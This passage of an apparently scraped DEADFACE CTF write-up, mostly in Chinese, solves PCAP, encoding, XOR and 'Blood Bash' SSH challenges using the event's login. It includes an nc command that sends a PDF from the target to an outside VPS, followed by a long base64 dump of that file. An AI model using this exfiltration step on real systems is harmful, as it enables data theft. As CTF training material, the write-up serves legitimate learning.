.exe and .bin (a Windows binary and a Linux binary, respectively). What are the MD5 hashes of the two tool programs? Submit both hashes as the flag, separated by a |: flag{ExeMD5|BinMD5} Use the PCAP from LYTTON LABS 01 - Monstrum ex Machina. Luciafer下载了两个具有相同名称的二进制文件(分别以.exe和.bin结尾),两个文件的md5值拼接后即为flag 使用Wireshark分析pcap-challenge-final.pcapng文件,发现是下载了lytton-crypt.exe和lytton-crypt.bin两个文件 选中一个接收lytton-crypt.exe文件的数据包,右键点击“跟踪流”-&gt;”TCP流” 然后点击“另存为”,保存为lytton-crypt.exe 重复上述步骤,得到lytton-crypt.bin.然后计算两个文件的md5值 ╭─ ~/CTF/DEADFACE ╰─$ md5 lytton-crypt.* MD5 (lytton-crypt.bin) = 4da8e81ee5b08777871e347a6b296953 MD5 (lytton-crypt.exe) = 9cb9b11484369b95ce35904c691a5b28 flag:flag&#123;9cb9b11484369b95ce35904c691a5b28|4da8e81ee5b08777871e347a6b296953&#125;","summary":"Poor MEAGAN!Oh, NO! Poor Megan! She’s just been bitten by a ZOMBIE! We can save her if we act fast, but the formula for the antidote has been scrambled somehow. Figure out how to unscramble &gt;the formula to save Megan from certain zombification. Enter the answer as flag{here-is-the-answer}. The formula for the antidote: j2rXjx9dkhW9eLKsnMR9cLDVjh&#x2F;9dwz1QfGXm+b9&#x3D;wKslL1Zpb45 看起来像一个base64字符串,但是似乎被混淆了,使用CyberChef搭配Megan35解码即可 flag:flag&#123;Six-Parts-Honey-One-Part-Garlic&#125; To Be Xor Not to Be.$)&#x2F;3&lt;’e-)&lt;e’:e&amp;’&lt;e&lt;’e-)&lt;5 Submit the flag as flag{here-is-the-answer} 直接使用CyberChef里的XOR Brute Force即可: flag:flag&#123;to-eat-or-not-to-eat&#125; Blood BashWe’ve obtained access to a system maintained by bl0ody_mary. There are five flag files that we need you to read and submit. Submit the contents of flag1.txt. Username: bl0ody_mary Password: d34df4c3 bloodbash.deadface.io:22 使用ssh命令连接,ls - R后发现Documents目录下有一个flag.txt文件,直接cat即可. ╭─ ~/CTF/DEADFACECTF ╰─$ ssh bl0ody_mary@bloodbash.deadface.io bl0ody_mary@bloodbash.deadface.io&#39;s password: bl0ody_mary@16ef1481fce1:~$ ls -R .: &#39;De Monne Customer Portal.pdf&#39; Documents Downloads Music Pictures Videos ./Documents: flag1.txt ./Downloads: ./Music: ./Pictures: ./Videos: bl0ody_mary@16ef1481fce1:~$ cat Documents/flag1.txt flag&#123;cd134eb8fbd794d4065dcd7cfa7efa6f3ff111fe&#125; flag:flag&#123;cd134eb8fbd794d4065dcd7cfa7efa6f3ff111fe&#125; Blood Bash 2We’ve obtained access to a system maintained by bl0ody_mary. We believe bl0ody_mary stole a sensitive document and is storing it on her Linux machine. Search her system for any files relating to De Monne Financial. Username: bl0ody_mary Password: d34df4c3 bloodbash.deadface.io:22 在Documents目录ls -a后发现存在文件.demonne_info.txt,cat即可 bl0ody_mary@16ef1481fce1:~$ ls -a . .. flag.txt .demonne_info.txt bl0ody_mary@16ef1481fce1:~$ cat .demonne_info.txt flag&#123;a856b162978fe563537c6890cb184c48fc2a018a&#125; flag:flag&#123;a856b162978fe563537c6890cb184c48fc2a018a&#125; Blood Bash 3There’s a flag on this system that we’re having difficulty with. Unlike the previous flags, we can’t seem to find a file with this flag in it. Perhaps the flag isn’t stored in a traditional file? Username: bl0ody_mary Password: d34df4c3 bloodbash.deadface.io:22 在Unix&#x2F;Linux系统中“一切皆文件”,socket也被认为是一种文件. 题意提示我们flag没有被存储在传统文件中,运行netstat -ano bl0ody_mary@5349049d19cd:~$ netstat -ano Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State Timer udp 0 0 127.0.0.1:43526 0.0.0.0:* off (0.00/0/0) 注意到有本地43526端口的监听(UDP),用nc连接一下 bl0ody_mary@16ef1481fce1:~$ nc -u 127.0.0.1 43526 flag&#123;open_port(al)s&#125; flag:flag&#123;open_port(al)s&#125; Blood Bash 4A sensitive file from De Monne was exfiltrated by mort1cia. It contains data relating to a new web portal they’re creating for their consumers. Read the contents of the file and return the flag as flag&#123;flag_goes_here&#125;. Username: bl0ody_mary Password: d34df4c3 bloodbash.deadface.io:22 测试后发现无法使用curl,只有nc可以使用. nc也可以用来传输文件,首先在自己的VPS上使用nc监听6379端口,准备接收文件 root@VM-8-4-centos: ~$ nc -l 8000 &gt; a.pdf 在比赛的服务器上用nc发送文件 bl0ody_mary@5349049d19cd:~$ nc -w 10 xx.xx.xxx.xxx 8000 &lt; De\\ Monne\\ Customer\\ Portal.pdf 下载pdf文件并打开,即可看到flag 另一种解法在比赛的服务器上使用base64命令将文件编码,复制后保存至本地文件encoded ~$ base64 De\\ Monne\\ Customer\\ Portal.pdf JVBERi0xLjYNJeLjz9MNCjExIDAgb2JqDTw8L0xpbmVhcml6ZWQgMS9MIDEyNDQ0L08gMTMvRSA4 MjgyL04gMS9UIDEyMTQxL0ggWyA0MzggMTQ1XT4+DWVuZG9iag0gICAgICAgICAgICAgICAgICAg DQoxNiAwIG9iag08PC9EZWNvZGVQYXJtczw8L0NvbHVtbnMgMy9QcmVkaWN0b3IgMTI+Pi9GaWx0 ZXIvRmxhdGVEZWNvZGUvSURbPDAyRjM1ODk5M0MxRDE0NEU4Q0Y2RDJGMkEyNzlBQzRGPjwxRUIy RkIxOTI5MURDRDREOTgzOTc3MTU5QzlBNzU5Nj5dL0luZGV4WzExIDddL0luZm8gMTAgMCBSL0xl bmd0aCAzNi9QcmV2IDEyMTQyL1Jvb3QgMTIgMCBSL1NpemUgMTgvVHlwZS9YUmVmL1dbMSAyIDBd Pj5zdHJlYW0NCmjeYmJkEGBiYDJnYmDwYWJg3AWkS5gY/m4Gsp0AAgwAI6cDxw0KZW5kc3RyZWFt DWVuZG9iag1zdGFydHhyZWYNCjANCiUlRU9GDQogICAgICAgIA0KMTcgMCBvYmoNPDwvRmlsdGVy L0ZsYXRlRGVjb2RlL0kgODIvTGVuZ3RoIDYxL08gNjYvUyAzNj4+c3RyZWFtDQpo3mJgYGBmYGBi YgAC2eMMmICFgQOJxwzFDAwlDLxMBgwWXiA2IwODQjSEZrgD1sOgNw3KvwkQYACjPAUuDQplbmRz dHJlYW0NZW5kb2JqDTEyIDAgb2JqDTw8L01ldGFkYXRhIDIgMCBSL091dGxpbmVzIDYgMCBSL1Bh Z2VzIDkgMCBSL1R5cGUvQ2F0YWxvZz4+DWVuZG9iag0xMyAwIG9iag08PC9Db250ZW50cyAxNCAw IFIvQ3JvcEJveFswLjAgMC4wIDYxMi4wIDc5Mi4wXS9NZWRpYUJveFswLjAgMC4wIDYxMi4wIDc5 Mi4wXS9QYXJlbnQgOSAwIFIvUmVzb3VyY2VzPDwvUHJvY1NldFsvUERGL0ltYWdlQ10vWE9iamVj dDw8L0ltMCAxNSAwIFI+Pj4+L1JvdGF0ZSAwL1R5cGUvUGFnZT4+DWVuZG9iag0xNCAwIG9iag08 PC9MZW5ndGggNjY+PnN0cmVhbQ0KcQoyNzMuMDIwMDE5NSAwIDAgMzQuMTk5OTk2OSAxNjEuNzcw NjkwOSA3MjQuMDk3Nzc4MyBjbQovSW0wIERvClEKDQplbmRzdHJlYW0NZW5kb2JqDTE1IDAgb2Jq DTw8L0JpdHNQZXJDb21wb25lbnQgOC9Db2xvclNwYWNlL0RldmljZVJHQi9GaWx0ZXIvRENURGVj b2RlL0hlaWdodCA1Ny9MZW5ndGggNzE1OC9OYW1lL1gvU3VidHlwZS9JbWFnZS9UeXBlL1hPYmpl Y3QvV2lkdGggNDU1Pj5zdHJlYW0NCv/Y/+4ADkFkb2JlAGQAAAAAAf/bAMUADAgICAgIDAgIDBAL CwsMDw4NDQ4UEg4OExMSFxQSFBQaGxcUFBseHicbFCQnJycnJDI1NTUyOzs7Ozs7Ozs7OwENCgoM CgwODAwOEQ4ODA0RFBQPDxEUEBEYERAUFBMUFRUUExQVFRUVFRUVGhoaGhoaHh4eHh4jIyMjJycn LCwsAg0KCgwKDA4MDA4RDg4MDREUFA8PERQQERgREBQUExQVFRQTFBUVFRUVFRUaGhoaGhoeHh4e HiMjIyMnJycsLCz/3QAEAB3/wAARCAA5AccDACIAAREBAhEC/8QBogABAAMAAQQDAAAAAAAAAAAA AAUGBwIBAwQICQoLAQEAAQEJAAAAAAAAAAAAAAAAAQIDBAUGBwgJCgsQAAADAwMDBAxZLQAAAAAA AAECAwAEEQUGEgcTIRQxMkEVFiIjNkJRYXWBk7IICQoXGBkaJCUmJygpKjM0NTc4OTpDREVGR0hJ SlJTVFVWV1hZWmJjZGVmZ2hpanFyc3R2d3h5eoKDhIWGh4iJipGSlJWWl5iZmqGio6Slpqeoqaqx s7S1tre4ubrBwsPExcbHyMnK0dLT1NXW19jZ2uHi4+Tl5ufo6erw8fLz9PX29/j5+hEAAAECBAQH cx0AAAAAAAAAAQACESExQQMSUWETQkNxgdHwBAUGBwgJChQVFhcYGRoiIyQlJicoKSoyMzQ1Njc4 OTpERUZHSElKUlNUVVZXWFlaYmNkZWZnaGlqcnN0dXZ3eHl6goOEhYaHiImKkZKTlJWWl5iZmqGi o6SlpqeoqaqxsrO0tba3uLm6wcLDxMXGx8jJ8crS09TV1tfY2drh4uPk5ebn6Onq8vP09fb3+Pn6 /9oADAMAAAERAhEAPwDVWMYwhGN213h3dUjLvSpEUiXJRQwEIG/iIgAN4rpLsiSgY5HCUHV6MmQT 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 RjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIRjGMIX/2Q0K ZW5kc3RyZWFtDWVuZG9iag0xIDAgb2JqDTw8L0ZpbHRlci9GbGF0ZURlY29kZS9GaXJzdCAxNC9M ZW5ndGggMTI2L04gMy9UeXBlL09ialN0bT4+c3RyZWFtDQpo3jJTMFAwVzCxVLBQsDRSsLHRd84v zStRMNR3yywqLgFKGSgE6fskwpkhlQWp+v6lJTmZeanFdnZADY5ArSCZgMSiVKBOM4iyzJKcVA2n nMS8bIWAxPRUTbBSl2hDY7B0RGQUyF6gjXmlOTmx+sH67vkh+XZ2AAEGAKanJzYNCmVuZHN0cmVh bQ1lbmRvYmoNMiAwIG9iag08PC9MZW5ndGggMzIwNS9TdWJ0eXBlL1hNTC9UeXBlL01ldGFkYXRh Pj5zdHJlYW0NCjw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3pr YzlkIj8+Cjx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2Jl IFhNUCBDb3JlIDUuNi1jMDE3IDkxLjE2NDQ2NCwgMjAyMC8wNi8xNS0xMDoyMDowNSAgICAgICAg Ij4KICAgPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJk Zi1zeW50YXgtbnMjIj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAg ICAgICAgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIgogICAgICAgICAg ICB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iCiAgICAgICAgICAg IHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIgogICAgICAgICAg ICB4bWxuczpwZGY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGRmLzEuMy8iPgogICAgICAgICA8eG1w Ok1vZGlmeURhdGU+MjAyMS0wNy0xN1QyMDo1OToyNC0wNTowMDwveG1wOk1vZGlmeURhdGU+CiAg ICAgICAgIDx4bXA6Q3JlYXRlRGF0ZT4yMDIxLTA3LTE3VDIwOjU1OjIwLTA1OjAwPC94bXA6Q3Jl YXRlRGF0ZT4KICAgICAgICAgPHhtcDpNZXRhZGF0YURhdGU+MjAyMS0wNy0xN1QyMDo1OToyNC0w NTowMDwveG1wOk1ldGFkYXRhRGF0ZT4KICAgICAgICAgPHhtcDpDcmVhdG9yVG9vbD5BZG9iZSBB Y3JvYmF0IFBybyBEQyAoMzItYml0KSAyMS41LjIwMDU4PC94bXA6Q3JlYXRvclRvb2w+CiAgICAg ICAgIDxkYzpmb3JtYXQ+YXBwbGljYXRpb24vcGRmPC9kYzpmb3JtYXQ+CiAgICAgICAgIDx4bXBN TTpEb2N1bWVudElEPnV1aWQ6ODA3OGUyYWUtZDc4Yy00ZjNlLWFkZWUtMGFkM2NiMzU3ZjM1PC94 bXBNTTpEb2N1bWVudElEPgogICAgICAgICA8eG1wTU06SW5zdGFuY2VJRD51dWlkOjc1ZjNiNTNi LTZkYTgtNGNhNi1hYzZkLTVlOGU2NGY1NjMyODwveG1wTU06SW5zdGFuY2VJRD4KICAgICAgICAg PHBkZjpQcm9kdWNlcj5BZG9iZSBBY3JvYmF0IFBybyBEQyAoMzItYml0KSAyMS41LjIwMDU4PC9w ZGY6UHJvZHVjZXI+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICA8L3JkZjpSREY+CjwveDp4 bXBtZXRhPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAg 